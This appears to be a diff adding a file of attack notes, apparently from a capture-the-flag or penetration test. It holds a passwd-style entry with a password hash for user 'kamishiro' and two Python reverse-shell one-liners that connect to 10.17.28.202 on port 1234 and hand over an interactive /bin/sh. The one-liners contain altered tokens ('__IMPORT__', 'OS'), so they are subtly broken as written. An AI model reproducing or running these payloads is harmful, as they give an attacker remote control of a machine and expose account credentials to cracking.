@@ -1,0 +1,5 @@
+kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:
+
+python3 -c '__IMPORT__ socket,subprocess,OS;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.28.202",1234));OS.dup2(s.fileno(),0);OS.dup2(s.fileno(),1);OS.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+export RHOST="10.17.28.202";export RPORT=1234;python -c '__IMPORT__ socket,OS,pty;s=socket.socket();s.connect((OS.getenv("RHOST"),int(OS.getenv("RPORT"))));[OS.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
